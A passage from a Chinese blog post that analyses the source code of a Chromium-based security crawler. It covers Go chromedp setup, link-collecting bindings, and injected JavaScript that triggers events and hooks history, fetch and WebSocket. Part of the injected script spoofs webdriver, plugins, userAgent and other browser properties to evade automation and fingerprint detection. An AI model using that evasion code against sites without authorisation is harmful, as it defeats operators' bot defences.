对最多5个子节点（或所有子节点如果少于5个）递归执行相同操作</span><br><span class="hljs-keyword">let</span> max = node.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>&gt;<span class="hljs-number">5</span>?<span class="hljs-number">5</span>:node.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> count=<span class="hljs-number">0</span>;count&lt;max;count++) &#123;<br><span class="hljs-keyword">let</span> index = <span class="hljs-built_in">parseInt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()*node.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>,<span class="hljs-number">10</span>);<br><span class="hljs-title function_">transmit_child</span>(node.<span class="hljs-property">children</span>[index], event, _loop);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-comment">// 选择所有带有特定标记（sec_auto_dom2_event_flag）的节点</span><br><span class="hljs-keyword">let</span> nodes = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;[sec_auto_dom2_event_flag]&quot;</span>);<br><span class="hljs-keyword">if</span> (nodes.<span class="hljs-property">length</span> &gt; <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-comment">// 如果选中的节点超过200，只取前200个</span><br>nodes = nodes.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">200</span>);<br>&#125;<br>    <br>    <span class="hljs-comment">// 假设randArr是一个自定义函数，用于打乱数组顺序</span><br>nodes = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">randArr</span>(nodes);<br>    <br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> node <span class="hljs-keyword">of</span> nodes) &#123;<br><span class="hljs-keyword">let</span> loop = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 等待一段时间，%f需要替换为实际的等待时间（毫秒）</span><br><span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">sleep</span>(%f);<br>        <br>        <span class="hljs-comment">// 从节点获取要触发的事件名称列表，并使用Set去重</span><br><span class="hljs-keyword">let</span> event_name_list = node.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-keyword">let</span> event_name_set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(event_name_list);<br>event_name_list = [...event_name_set];<br>        <br>        <span class="hljs-comment">// 遍历所有事件名称</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> event_name <span class="hljs-keyword">of</span> event_name_list) &#123;<br>            <span class="hljs-comment">// 创建并初始化自定义事件</span><br><span class="hljs-keyword">let</span> evt = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createEvent</span>(<span class="hljs-string">&#x27;CustomEvent&#x27;</span>);<br>evt.<span class="hljs-title function_">initCustomEvent</span>(event_name, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-comment">// 对特定事件，递归地向子节点传递</span><br><span class="hljs-keyword">if</span> (event_name == <span class="hljs-string">&quot;click&quot;</span> || event_name == <span class="hljs-string">&quot;focus&quot;</span> || event_name == <span class="hljs-string">&quot;mouseover&quot;</span> || event_name == <span class="hljs-string">&quot;select&quot;</span>) &#123;<br><span class="hljs-title function_">transmit_child</span>(node, evt, loop);<br>&#125;<br>            <br>            <span class="hljs-comment">// 如果节点的class或id包含&quot;close&quot;，则跳过此节点</span><br><span class="hljs-keyword">if</span> ((node.<span class="hljs-property">className</span> &amp;&amp; node.<span class="hljs-property">className</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;close&quot;</span>)) || (node.<span class="hljs-property">id</span> &amp;&amp; node.<span class="hljs-property">id</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;close&quot;</span>))) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>            <span class="hljs-comment">// 尝试在节点上触发事件</span><br><span class="hljs-keyword">try</span> &#123;<br>node.<span class="hljs-title function_">dispatchEvent</span>(evt);<br>&#125; <span class="hljs-keyword">catch</span>(e) &#123;&#125;<br>&#125;<br>&#125;<br>&#125;)() <span class="hljs-comment">// 立即执行函数</span><br><br></code></pre></td></tr></table></figure><p>事件触发完毕后等待，之后会移除掉监听：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span> <span class="hljs-title function_">remove_dom_listener</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;DOMNodeInserted&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;DOMSubtreeModified&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;DOMNodeInsertedIntoDocument&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;DOMAttrModified&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br>&#125;)()<br></code></pre></td></tr></table></figure><p>然后是 tab.HandleBindingCalled 这里去进行绑定函数的处理，这里的绑定是 Start() 中 runtime.AddBinding 绑定的函数，其中的 addLink 在 JS 中用的很多，就是各种情况操作都使用它去做链接收集，那就看下这里是如果实现的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> HandleBindingCalled(event *runtime.EventBindingCalled) &#123;<br><span class="hljs-keyword">defer</span> tab.WG.Done()<br>payload := []<span class="hljs-type">byte</span>(event.Payload)<br><span class="hljs-keyword">var</span> bcPayload bindingCallPayload<br>_ = json.Unmarshal(payload, &amp;bcPayload)<br>    <span class="hljs-comment">// 对于 addLink 获取它的 url 然后添加到 ResultUrl 中 =&gt; JS 和 Go 进行交互 </span><br><span class="hljs-keyword">if</span> bcPayload.Name == <span class="hljs-string">&quot;addLink&quot;</span> &amp;&amp; <span class="hljs-built_in">len</span>(bcPayload.Args) &gt; <span class="hljs-number">1</span> &#123;<br>tab.AddResultUrl(config.GET, bcPayload.Args[<span class="hljs-number">0</span>], bcPayload.Args[<span class="hljs-number">1</span>])<br>&#125;<br><span class="hljs-keyword">if</span> bcPayload.Name == <span class="hljs-string">&quot;Test&quot;</span> &#123;<br>fmt.Println(bcPayload.Args)<br>&#125;<br>tab.Evaluate(fmt.Sprintf(js.DeliverResultJS, bcPayload.Name, bcPayload.Seq, <span class="hljs-string">&quot;s&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>标签页创建完成之后就使用 Start() 开始爬行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> Start() &#123;<br>logger.Logger.Info(<span class="hljs-string">&quot;Crawling &quot;</span> + tab.NavigateReq.Method + <span class="hljs-string">&quot; &quot;</span> + tab.NavigateReq.URL.String())<br><span class="hljs-keyword">defer</span> tab.Cancel()<br><span class="hljs-keyword">if</span> err := chromedp.Run(*tab.Ctx,<br>RunWithTimeOut(tab.Ctx, tab.config.DomContentLoadedTimeout, chromedp.Tasks&#123;<br><span class="hljs-comment">//</span><br>runtime.Enable(),<br><span class="hljs-comment">// 开启网络层API</span><br>network.Enable(),<br><span class="hljs-comment">// 开启请求拦截API</span><br>fetch.Enable().WithHandleAuthRequests(<span class="hljs-literal">true</span>),<br><span class="hljs-comment">// 添加回调函数绑定</span><br><span class="hljs-comment">// XSS-Scan 使用的回调</span><br>runtime.AddBinding(<span class="hljs-string">&quot;addLink&quot;</span>),<br>runtime.AddBinding(<span class="hljs-string">&quot;Test&quot;</span>),<br><span class="hljs-comment">// 初始化执行JS</span><br>chromedp.ActionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>                <span class="hljs-comment">// 页面加载时执行JS代码</span><br>_, err = page.AddScriptToEvaluateOnNewDocument(js.TabInitJS).Do(ctx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;),<br>network.SetExtraHTTPHeaders(tab.ExtraHeaders),<br><span class="hljs-comment">// 执行导航</span><br>chromedp.Navigate(tab.NavigateReq.URL.String()),<br>&#125;),<br>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> errors.Is(err, context.Canceled) &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;Crawling Canceled&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>logger.Logger.Warn(<span class="hljs-string">&quot;navigate timeout &quot;</span>, tab.NavigateReq.URL.String())<br>&#125;<br><br>waitDone := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125; &#123;<br>tab.WG.Wait()<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(ch)<br><span class="hljs-keyword">return</span> ch<br>&#125;<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-waitDone():<br>logger.Logger.Debug(<span class="hljs-string">&quot;all navigation tasks done.&quot;</span>)<br><span class="hljs-keyword">case</span> &lt;-time.After(tab.config.DomContentLoadedTimeout + time.Second*<span class="hljs-number">10</span>):<br>logger.Logger.Warn(<span class="hljs-string">&quot;navigation tasks TIMEOUT.&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// 等待收集所有链接</span><br>logger.Logger.Debug(<span class="hljs-string">&quot;collectLinks start.&quot;</span>)<br>tab.collectLinkWG.Add(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">go</span> tab.collectLinks()<br>tab.collectLinkWG.Wait()<br>logger.Logger.Debug(<span class="hljs-string">&quot;collectLinks end.&quot;</span>)<br><br><span class="hljs-comment">// 识别页面编码 并编码所有 URL</span><br><span class="hljs-keyword">if</span> tab.config.EncodeURLWithCharset &#123;<br>tab.DetectCharset()<br>tab.EncodeAllURLWithCharset()<br>&#125;<br><br><span class="hljs-comment">//fmt.Println(tab.NavigateReq.URL.String(), len(tab.ResultList))</span><br><span class="hljs-comment">//for _, v := range tab.ResultList &#123;</span><br><span class="hljs-comment">//v.SimplePrint()</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">// fmt.Println(&quot;Finished &quot; + tab.NavigateReq.Method + &quot; &quot; + tab.NavigateReq.URL.String())</span><br>&#125;<br></code></pre></td></tr></table></figure><p>它先去绑定了 addLink、Test 作用如下，主要是用于 go 和浏览器 JS 交互，这里的作用其实就是通过这种方式去收集链接，在 上面的 init_observer_sec_auto_b 和下面的 addTabInitScript 函数中都可以看到链接收集的操作。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240328141653434.png?imageSlim" alt="image-20240328141653434"></p><p>然后在加载页面时注入 js.TabInitJS ，该 JS 处理了初始化和各种场景的链接收集操作：</p><p>涉及的一些 JS 知识：</p><ul><li>window.navigator.webdriver：用于检测当前页面是否在使用自动化测试工具</li><li>navigator.plugins：返回浏览器的插件列表</li><li>navigator.permissions：提供了对浏览器权限状态的查询和更改的功能</li><li>Histor：接口允许操作浏览器的曾经在标签页或者框架里访问的会话历史记录</li><li>window.history.pushState：向浏览器的历史记录栈中添加一条新的记录，并在不刷新页面的情况下改变URL。这个方法常用于单页面应用程序（SPA）中，可以帮助开发者实现前端路由和用户界面的状态管理</li><li>window.history.replaceState：更改浏览器地址栏中显示的URL，而无需加载新的页面或重新加载现有页面。这对于在Web应用程序中实现单页应用程序（SPA）非常有用，因为可以更改URL并在不刷新整个页面的情况下更新应用程序的状态。</li><li>hash 属性：一个可读可写的字符串，该字符串是 URL 的锚部分，一般有当前页面中 href 中 # 地址触发。hash 即 URL 中 # 字符后面的部分。可以通过 window.location.hash 属性获取和设置 hash 值。window.location.hash 值的变化会直接反应到浏览器地址栏（#后面的部分会发生变化），同时，浏览器地址栏 hash 值的变化也会触发 window.location.hash 值的变化，从而触发 onhashchange 事件。当 URL 的片段标识符更改时，将触发 hashchange 事件。Vue 这种前端框架就是 #&#x2F;path 的</li><li>window.EventSource：创建一个新的 <code>EventSource</code>，用于从指定的 URL 接收服务器发送事件，可以选择开启凭据模式。这是服务器向浏览器推送信息除过 websocket 的另一种方式 。</li><li>window.fetch：是浏览器提供的用于发起网络请求的API。它是一种现代的替代传统XHR（XMLHttpRequest）的方式，提供了更简洁和强大的请求和响应处理能力。</li><li>window.open：是JavaScript中的一个方法，用于在浏览器中打开一个新窗口或标签页，并加载指定的URL。</li><li>window.setInterval：定时调用的函数，可按照指定的周期（以毫秒计）来调用函数或计算表达式。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><code class="hljs go">(function addTabInitScript () &#123;<br><br><span class="hljs-comment">// 移除 window.navigator.webdriver</span><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;webdriver&#x27;</span>, &#123;<br>        get: () =&gt; <span class="hljs-literal">false</span>,<br>    &#125;);<br><br><span class="hljs-comment">// 绕过浏览器插件数量测试</span><br>    <span class="hljs-comment">// 开发者可能会检测浏览器中已安装的插件数量，以此作为一种安全检测机制或用于浏览器指纹识别。</span><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;plugins&#x27;</span>, &#123;<br>        get: () =&gt; [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>],<br>    &#125;);<br><br><span class="hljs-comment">// 用于通过 Chrome 测试</span><br>    <span class="hljs-comment">// 网站开发者可能会检测浏览器是否为Chrome浏览器，并根据检测结果提供不同的行为。</span><br>window.chrome = &#123;<br>runtime: &#123;&#125;,<br>&#125;;<br><br><span class="hljs-comment">// 修改浏览器权限通知行为</span><br>    <span class="hljs-comment">// 在特定的测试场景或需要检查通知权限的情况下，模拟返回不同的通知权限状态。通过返回自定义的权限状态对象，网页可以根据不同的权限状态来执行相应的逻辑，例如显示不同的提示信息、调整页面行为等。</span><br>  <span class="hljs-keyword">const</span> originalQuery = window.navigator.permissions.query;<br>window.navigator.permissions.query = (parameters) =&gt; (<br>    parameters.name === <span class="hljs-string">&#x27;notifications&#x27;</span> ?<br>Promise.resolve(&#123; state: Notification.permission &#125;) :<br>originalQuery(parameters)<br>);<br><br><span class="hljs-comment">// 模拟 userAgent</span><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;userAgent&#x27;</span>, &#123;<br>        get: () =&gt; <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36&quot;</span>,<br>    &#125;);<br><br><span class="hljs-comment">// 修改浏览器对象的属性</span><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;platform&#x27;</span>, &#123;<br>get: function () &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;win32&#x27;</span>; &#125;<br>&#125;);<br><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;language&#x27;</span>, &#123;<br>get: function () &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zh-CN&#x27;</span>; &#125;<br>&#125;);<br><br>Object.defineProperty(navigator, <span class="hljs-string">&#x27;languages&#x27;</span>, &#123;<br>get: function () &#123; <span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;zh-CN&quot;</span>, <span class="hljs-string">&quot;zh&quot;</span>]; &#125;<br>&#125;);<br><br><span class="hljs-comment">// history api hook</span><br>    <span class="hljs-comment">// 重写 pushState replaceState 方法 监听历史记录中的 API </span><br>    <span class="hljs-comment">// 使用使用 window.addLink  去记录 API 到 HistoryAPI</span><br>window.history.pushState = function(a, b, c) &#123; <br>window.addLink(c, <span class="hljs-string">&quot;HistoryAPI&quot;</span>);<br>&#125;<br>window.history.replaceState = function(a, b, c) &#123; <br>window.addLink(c, <span class="hljs-string">&quot;HistoryAPI&quot;</span>);<br>&#125;<br>    <span class="hljs-comment">// 可写性和可配置性设置为false，即禁止对这两个方法进行重写或修改。</span><br>Object.defineProperty(window.history,<span class="hljs-string">&quot;pushState&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br>Object.defineProperty(window.history,<span class="hljs-string">&quot;replaceState&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br>    <span class="hljs-comment">// 添加 hashchange 事件监听，监听 hash</span><br>window.addEventListener(<span class="hljs-string">&quot;hashchange&quot;</span>, function() &#123;<br>window.addLink(document.location.href, <span class="hljs-string">&quot;HashChange&quot;</span>);<br>&#125;);<br><span class="hljs-comment">// 重写 webSocket 构造方法 记录 websokcet 连接相关信息</span><br><span class="hljs-keyword">var</span> oldWebSocket = window.WebSocket;<br>window.WebSocket = function(url, arg) &#123;<br>window.addLink(url, <span class="hljs-string">&quot;WebSocket&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> oldWebSocket(url, arg);<br>&#125;<br><span class="hljs-comment">// 重写 EventSource 构造方法 记录 EventSource 连接相关信息</span><br><span class="hljs-keyword">var</span> oldEventSource = window.EventSource;<br>window.EventSource = function(url) &#123;<br>window.addLink(url, <span class="hljs-string">&quot;EventSource&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> oldEventSource(url);<br>&#125;<br><span class="hljs-comment">// 记录 fetch 发起请求的 url</span><br><span class="hljs-keyword">var</span> oldFetch = window.fetch;<br>window.fetch = function(url) &#123;<br>window.addLink(url, <span class="hljs-string">&quot;Fetch&quot;</span>);<br><span class="hljs-keyword">return</span> oldFetch(url);<br>&#125;<br><br><span class="hljs-comment">// 锁定表单重置</span><br>HTMLFormElement.prototype.reset = function() &#123;console.log(<span class="hljs-string">&quot;cancel reset form&quot;</span>)&#125;;<br>Object.defineProperty(HTMLFormElement.prototype,<span class="hljs-string">&quot;reset&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br><span class="hljs-comment">// 监听 DOM2 级事件</span><br>window.add_even_listener_count_sec_auto = &#123;&#125;;<br><span class="hljs-comment">// DOM2 级事件限制函数</span><br>let old_event_handle = Element.prototype.addEventListener;<br>Element.prototype.addEventListener = function(event_name, event_func, useCapture) &#123;<br>let name = <span class="hljs-string">&quot;&lt;&quot;</span> + this.tagName + <span class="hljs-string">&quot;&gt; &quot;</span> + this.id + this.name + this.getAttribute(<span class="hljs-string">&quot;class&quot;</span>) + <span class="hljs-string">&quot;|&quot;</span> + event_name;<br><span class="hljs-comment">// console.log(name)</span><br><span class="hljs-comment">// 对每个事件设定最大的添加次数，防止无限触发，最大次数为5</span><br><span class="hljs-keyword">if</span> (!window.add_even_listener_count_sec_auto.hasOwnProperty(name)) &#123;<br>window.add_even_listener_count_sec_auto[name] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (window.add_even_listener_count_sec_auto[name] == <span class="hljs-number">5</span>) &#123;<br><span class="hljs-keyword">return</span> ;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> window.add_even_listener_count_sec_auto[name] += <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (this.hasAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>)) &#123;<br>let sec_auto_dom2_event_flag = this.getAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>);<br>this.setAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>, sec_auto_dom2_event_flag + <span class="hljs-string">&quot;|&quot;</span> + event_name);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>this.setAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>, event_name);<br>&#125;<br>old_event_handle.apply(this, arguments);<br>&#125;;<br><span class="hljs-comment">// Dom0 级事件限制函数</span><br>function dom0_listener_hook(that, event_name) &#123;<br>let name = <span class="hljs-string">&quot;&lt;&quot;</span> + that.tagName + <span 